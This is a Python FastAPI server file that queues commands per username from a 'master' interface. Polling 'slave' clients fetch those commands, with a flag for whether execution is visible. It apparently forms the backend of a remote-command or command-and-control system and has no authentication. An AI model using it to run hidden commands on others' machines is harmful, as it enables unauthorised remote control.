from fastapi import FastAPI
from pydantic import BaseModel
import sqlite3

app = FastAPI()

# Initialize SQLite Database
def init_db():
    conn = sqlite3.connect("database.db")
    cursor = conn.cursor()
    cursor.execute("""
        CREATE TABLE IF NOT EXISTS clients (
            username TEXT PRIMARY KEY,
            cmd TEXT,
            run INTEGER DEFAULT 0,
            visible INTEGER DEFAULT 1,
            updated_at TEXT
        )
    """)
    conn.commit()
    conn.close()

init_db()

class CommandModel(BaseModel):
    username: str
    cmd: str
    visible: int = 1

# 1. Master Web Interface sends a command here
@app.post("/api/command")
def set_command(data: CommandModel):
    conn = sqlite3.connect("database.db")
    cursor = conn.cursor()
    cursor.execute("""
        INSERT INTO clients (username, cmd, run, visible, updated_at)
        VALUES (?, ?, 1, ?, datetime('now'))
        ON CONFLICT(username) DO UPDATE SET
            cmd = excluded.cmd,
            run = 1,
            visible = excluded.visible,
            updated_at = datetime('now')
    """, (data.username, data.cmd, data.visible))
    conn.commit()
    conn.close()
    return {"status": "success", "message": "Command queued"}

# 2. Slave Client polls this endpoint to get its pending command
@app.get("/api/poll")
def poll_command(username: str):
    conn = sqlite3.connect("database.db")
    cursor = conn.cursor()
    
    # Update heartbeat timestamp
    cursor.execute("""
        INSERT INTO clients (username, updated_at) VALUES (?, datetime('now'))
        ON CONFLICT(username) DO UPDATE SET updated_at = datetime('now')
    """, (username,))
    conn.commit()

    # Check if there is a command to run
    cursor.execute("SELECT cmd, run, visible FROM clients WHERE username = ?", (username,))
    row = cursor.fetchone()
    
    if row and row[1] == 1: # If 'run' is true
        cmd, run, visible = row[0], row[1], row[2]
        # Clear the command so it doesn't loop forever
        cursor.execute("UPDATE clients SET run = 0 WHERE username = ?", (username,))
        conn.commit()
        conn.close()
        return {"cmd": cmd, "run": True, "visible": visible}
    
    conn.close()
    return {"cmd": "", "run": False}